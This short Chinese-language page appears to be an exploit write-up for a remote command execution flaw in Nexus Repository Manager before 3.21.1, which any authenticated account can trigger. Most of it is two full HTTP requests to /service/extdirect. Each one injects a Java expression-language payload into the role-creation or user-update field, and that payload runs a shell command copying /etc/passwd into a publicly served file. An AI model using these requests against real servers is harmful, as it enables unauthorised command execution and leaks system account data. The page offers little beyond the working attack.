<languages /> <translate>

漏洞影響
--------

</translate> Nexus \< 3.21.1

<translate>

前提條件
--------

</translate> <translate> 漏洞觸發需要任意賬戶權限 </translate> <translate>

漏洞利用
--------

</translate> <translate> 該漏洞需要訪問更新角色或創建角色接口，登錄任意用戶後修改 NXSESSIONID

發送請求包執行命令 </translate>

    POST /service/extdirect HTTP/1.1
    Host:
    accept: application/json
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
    NX-ANTI-CSRF-TOKEN: 0.856555763510765
    Content-Type: application/json
    Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=e9d6620d-6843-49a6-a887-cd7cef74d413
    Content-Length: 304


    {"action":"coreui_Role","method":"create","data":[{"version":"","source":"default","id":"1111","name":"2222","description":"3333","privileges":["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}"],"roles":[]}],"type":"rpc","tid":89}

<translate> 另外一個漏洞點 </translate>

    POST /service/extdirect HTTP/1.1
    Host:
    accept: application/json
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
    NX-ANTI-CSRF-TOKEN: 0.856555763510765
    Content-Type: application/json
    Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=e9d6620d-6843-49a6-a887-cd7cef74d413
    Content-Length: 304


    {"action":"coreui_User","method":"update","data":[{"userId":"www","version":"2","firstName":"www","lastName":"www","email":"www@qq.com","status":"active","roles":["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}"]}],"type":"rpc","tid":9}